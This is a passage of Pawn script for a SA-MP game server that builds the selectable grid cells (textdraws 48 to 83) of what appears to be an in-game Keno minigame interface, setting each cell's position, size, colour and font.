	PlayerTextDrawLetterSize(playerid, KenoTD[48], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[48], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[48], 1);
	PlayerTextDrawColor(playerid, KenoTD[48], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[48], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[48], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[48], 255);
	PlayerTextDrawFont(playerid, KenoTD[48], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[48], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[48], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[48], true);

	KenoTD[49] = CreatePlayerTextDraw(playerid, 220.799591, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[49], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[49], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[49], 1);
	PlayerTextDrawColor(playerid, KenoTD[49], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[49], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[49], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[49], 255);
	PlayerTextDrawFont(playerid, KenoTD[49], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[49], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[49], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[49], true);

	KenoTD[50] = CreatePlayerTextDraw(playerid, 247.101196, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[50], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[50], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[50], 1);
	PlayerTextDrawColor(playerid, KenoTD[50], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[50], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[50], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[50], 255);
	PlayerTextDrawFont(playerid, KenoTD[50], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[50], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[50], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[50], true);

	KenoTD[51] = CreatePlayerTextDraw(playerid, 274.302856, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[51], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[51], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[51], 1);
	PlayerTextDrawColor(playerid, KenoTD[51], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[51], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[51], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[51], 255);
	PlayerTextDrawFont(playerid, KenoTD[51], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[51], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[51], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[51], true);

	KenoTD[52] = CreatePlayerTextDraw(playerid, 302.504577, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[52], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[52], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[52], 1);
	PlayerTextDrawColor(playerid, KenoTD[52], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[52], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[52], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[52], 255);
	PlayerTextDrawFont(playerid, KenoTD[52], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[52], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[52], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[52], true);

	KenoTD[53] = CreatePlayerTextDraw(playerid, 330.306274, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[53], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[53], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[53], 1);
	PlayerTextDrawColor(playerid, KenoTD[53], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[53], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[53], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[53], 255);
	PlayerTextDrawFont(playerid, KenoTD[53], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[53], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[53], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[53], true);

	KenoTD[54] = CreatePlayerTextDraw(playerid, 357.807952, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[54], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[54], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[54], 1);
	PlayerTextDrawColor(playerid, KenoTD[54], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[54], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[54], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[54], 255);
	PlayerTextDrawFont(playerid, KenoTD[54], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[54], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[54], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[54], true);

	KenoTD[55] = CreatePlayerTextDraw(playerid, 384.109558, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[55], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[55], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[55], 1);
	PlayerTextDrawColor(playerid, KenoTD[55], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[55], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[55], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[55], 255);
	PlayerTextDrawFont(playerid, KenoTD[55], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[55], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[55], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[55], true);

	KenoTD[56] = CreatePlayerTextDraw(playerid, 411.811248, 204.402801, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[56], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[56], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[56], 1);
	PlayerTextDrawColor(playerid, KenoTD[56], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[56], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[56], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[56], 255);
	PlayerTextDrawFont(playerid, KenoTD[56], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[56], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[56], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[56], true);

	KenoTD[57] = CreatePlayerTextDraw(playerid, 438.012847, 204.452911, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[57], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[57], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[57], 1);
	PlayerTextDrawColor(playerid, KenoTD[57], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[57], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[57], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[57], 255);
	PlayerTextDrawFont(playerid, KenoTD[57], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[57], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[57], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[57], true);

	KenoTD[58] = CreatePlayerTextDraw(playerid, 463.714416, 204.552917, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[58], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[58], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[58], 1);
	PlayerTextDrawColor(playerid, KenoTD[58], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[58], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[58], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[58], 255);
 	PlayerTextDrawFont(playerid, KenoTD[58], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[58], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[58], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[58], true);

	KenoTD[59] = CreatePlayerTextDraw(playerid, 220.799591, 237.704833, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[59], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[59], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[59], 1);
	PlayerTextDrawColor(playerid, KenoTD[59], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[59], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[59], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[59], 255);
	PlayerTextDrawFont(playerid, KenoTD[59], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[59], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[59], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[59], true);

	KenoTD[60] = CreatePlayerTextDraw(playerid, 247.101196, 237.704833, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[60], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[60], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[60], 1);
	PlayerTextDrawColor(playerid, KenoTD[60], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[60], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[60], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[60], 255);
	PlayerTextDrawFont(playerid, KenoTD[60], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[60], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[60], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[60], true);

	KenoTD[61] = CreatePlayerTextDraw(playerid, 274.302856, 237.604827, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[61], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[61], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[61], 1);
	PlayerTextDrawColor(playerid, KenoTD[61], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[61], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[61], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[61], 255);
	PlayerTextDrawFont(playerid, KenoTD[61], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[61], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[61], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[61], true);

	KenoTD[62] = CreatePlayerTextDraw(playerid, 302.504577, 237.904846, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[62], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[62], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[62], 1);
	PlayerTextDrawColor(playerid, KenoTD[62], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[62], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[62], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[62], 255);
	PlayerTextDrawFont(playerid, KenoTD[62], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[62], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[62], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[62], true);

	KenoTD[63] = CreatePlayerTextDraw(playerid, 330.306274, 237.704833, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[63], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[63], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[63], 1);
	PlayerTextDrawColor(playerid, KenoTD[63], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[63], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[63], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[63], 255);
	PlayerTextDrawFont(playerid, KenoTD[63], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[63], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[63], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[63], true);

	KenoTD[64] = CreatePlayerTextDraw(playerid, 356.307952, 237.804840, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[64], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[64], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[64], 1);
	PlayerTextDrawColor(playerid, KenoTD[64], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[64], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[64], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[64], 255);
	PlayerTextDrawFont(playerid, KenoTD[64], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[64], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[64], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[64], true);

	KenoTD[65] = CreatePlayerTextDraw(playerid, 384.109558, 237.604827, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[65], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[65], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[65], 1);
	PlayerTextDrawColor(playerid, KenoTD[65], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[65], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[65], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[65], 255);
	PlayerTextDrawFont(playerid, KenoTD[65], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[65], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[65], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[65], true);

	KenoTD[66] = CreatePlayerTextDraw(playerid, 411.811248, 237.667358, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[66], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[66], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[66], 1);
	PlayerTextDrawColor(playerid, KenoTD[66], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[66], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[66], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[66], 255);
	PlayerTextDrawFont(playerid, KenoTD[66], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[66], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[66], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[66], true);

	KenoTD[67] = CreatePlayerTextDraw(playerid, 438.012847, 237.754943, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[67], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[67], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[67], 1);
	PlayerTextDrawColor(playerid, KenoTD[67], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[67], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[67], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[67], 255);
	PlayerTextDrawFont(playerid, KenoTD[67], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[67], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[67], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[67], true);

	KenoTD[68] = CreatePlayerTextDraw(playerid, 463.714416, 237.654937, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[68], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[68], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[68], 1);
	PlayerTextDrawColor(playerid, KenoTD[68], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[68], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[68], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[68], 255);
	PlayerTextDrawFont(playerid, KenoTD[68], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[68], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[68], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[68], true);

	KenoTD[69] = CreatePlayerTextDraw(playerid, 220.799591, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[69], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[69], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[69], 1);
	PlayerTextDrawColor(playerid, KenoTD[69], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[69], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[69], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[69], 255);
	PlayerTextDrawFont(playerid, KenoTD[69], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[69], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[69], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[69], true);

	KenoTD[70] = CreatePlayerTextDraw(playerid, 246.501159, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[70], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[70], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[70], 1);
	PlayerTextDrawColor(playerid, KenoTD[70], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[70], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[70], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[70], 255);
	PlayerTextDrawFont(playerid, KenoTD[70], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[70], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[70], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[70], true);

	KenoTD[71] = CreatePlayerTextDraw(playerid, 274.002777, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[71], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[71], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[71], 1);
	PlayerTextDrawColor(playerid, KenoTD[71], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[71], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[71], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[71], 255);
	PlayerTextDrawFont(playerid, KenoTD[71], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[71], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[71], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[71], true);

	KenoTD[72] = CreatePlayerTextDraw(playerid, 303.204559, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[72], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[72], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[72], 1);
	PlayerTextDrawColor(playerid, KenoTD[72], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[72], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[72], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[72], 255);
	PlayerTextDrawFont(playerid, KenoTD[72], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[72], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[72], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[72], true);

	KenoTD[73] = CreatePlayerTextDraw(playerid, 330.706237, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[73], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[73], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[73], 1);
	PlayerTextDrawColor(playerid, KenoTD[73], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[73], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[73], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[73], 255);
	PlayerTextDrawFont(playerid, KenoTD[73], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[73], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[73], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[73], true);

	KenoTD[74] = CreatePlayerTextDraw(playerid, 356.707824, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[74], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[74], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[74], 1);
	PlayerTextDrawColor(playerid, KenoTD[74], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[74], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[74], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[74], 255);
	PlayerTextDrawFont(playerid, KenoTD[74], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[74], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[74], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[74], true);

	KenoTD[75] = CreatePlayerTextDraw(playerid, 384.309509, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[75], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[75], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[75], 1);
	PlayerTextDrawColor(playerid, KenoTD[75], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[75], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[75], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[75], 255);
	PlayerTextDrawFont(playerid, KenoTD[75], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[75], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[75], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[75], true);

	KenoTD[76] = CreatePlayerTextDraw(playerid, 412.211212, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[76], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[76], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[76], 1);
	PlayerTextDrawColor(playerid, KenoTD[76], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[76], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[76], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[76], 255);
	PlayerTextDrawFont(playerid, KenoTD[76], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[76], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[76], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[76], true);

	KenoTD[77] = CreatePlayerTextDraw(playerid, 438.012786, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[77], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[77], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[77], 1);
	PlayerTextDrawColor(playerid, KenoTD[77], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[77], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[77], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[77], 255);
	PlayerTextDrawFont(playerid, KenoTD[77], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[77], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[77], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[77], true);

	KenoTD[78] = CreatePlayerTextDraw(playerid, 463.714355, 260.606231, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[78], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[78], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[78], 1);
	PlayerTextDrawColor(playerid, KenoTD[78], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[78], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[78], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[78], 255);
	PlayerTextDrawFont(playerid, KenoTD[78], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[78], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[78], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[78], true);

	KenoTD[79] = CreatePlayerTextDraw(playerid, 220.799591, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[79], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[79], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[79], 1);
	PlayerTextDrawColor(playerid, KenoTD[79], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[79], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[79], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[79], 255);
	PlayerTextDrawFont(playerid, KenoTD[79], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[79], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[79], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[79], true);

	KenoTD[80] = CreatePlayerTextDraw(playerid, 246.901184, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[80], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[80], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[80], 1);
	PlayerTextDrawColor(playerid, KenoTD[80], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[80], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[80], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[80], 255);
	PlayerTextDrawFont(playerid, KenoTD[80], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[80], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[80], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[80], true);

	KenoTD[81] = CreatePlayerTextDraw(playerid, 273.702819, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[81], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[81], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[81], 1);
	PlayerTextDrawColor(playerid, KenoTD[81], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[81], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[81], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[81], 255);
	PlayerTextDrawFont(playerid, KenoTD[81], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[81], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[81], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[81], true);

	KenoTD[82] = CreatePlayerTextDraw(playerid, 302.804595, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[82], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[82], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[82], 1);
	PlayerTextDrawColor(playerid, KenoTD[82], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[82], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[82], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[82], 255);
	PlayerTextDrawFont(playerid, KenoTD[82], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[82], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[82], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[82], true);

	KenoTD[83] = CreatePlayerTextDraw(playerid, 330.906311, 283.807647, "LD_SPAC:white");
	PlayerTextDrawLetterSize(playerid, KenoTD[83], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, KenoTD[83], 23.000000, 19.000000);
	PlayerTextDrawAlignment(playerid, KenoTD[83], 1);
	PlayerTextDrawColor(playerid, KenoTD[83], 1113407743);
	PlayerTextDrawSetShadow(playerid, KenoTD[83], 0);
	PlayerTextDrawSetOutline(playerid, KenoTD[83], 0);
	PlayerTextDrawBackgroundColor(playerid, KenoTD[83], 255);
	PlayerTextDrawFont(playerid, KenoTD[83], 4);
	PlayerTextDrawSetProportional(playerid, KenoTD[83], 0);
	PlayerTextDrawSetShadow(playerid, KenoTD[83], 0);
	PlayerTextDrawSetSelectable(playerid, KenoTD[83], true);

